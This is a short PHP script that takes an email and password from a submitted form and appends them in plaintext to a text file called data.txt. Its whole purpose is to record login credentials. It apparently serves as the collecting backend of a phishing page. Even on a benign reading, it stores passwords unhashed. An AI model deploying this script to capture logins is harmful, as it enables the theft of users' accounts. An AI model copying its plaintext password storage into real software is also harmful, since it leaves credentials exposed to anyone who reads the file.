    <?php
    $path = 'data.txt';
    if (isset ($_POST ['email']) && isset($_POST['password'])) {
        $fh = fopen($path, "a+");
        $string = $_POST['email']. ' - '.$_POST['password'];
        fwrite($fh,$string);
        fclose($fh);
    }
    ?>